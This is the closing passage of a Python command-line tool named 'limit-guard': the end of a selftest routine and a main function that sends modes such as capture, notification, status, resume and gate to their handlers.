    print("selftest: %s" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


# --------------------------------------------------------------------------


def main(argv) -> int:
    mode = argv[1] if len(argv) > 1 else ""
    if mode == "--capture":
        return run_capture(sys.stdin.read())
    if mode == "--log-inner-error":
        return run_log_inner_error()
    if mode == "--notification":
        return run_notification(sys.stdin.read())
    if mode == "--status":
        return run_status()
    if mode == "--resume":
        return run_resume()
    if mode == "--selftest":
        return run_selftest()
    if mode in ("--version", "-V"):
        print("limit-guard %s" % VERSION)
        return 0
    if mode.startswith("-") and mode not in ("", "--gate"):
        print(__doc__, file=sys.stderr)
        return 2
    return run_gate(sys.stdin.read())


if __name__ == "__main__":
    sys.exit(main(sys.argv))
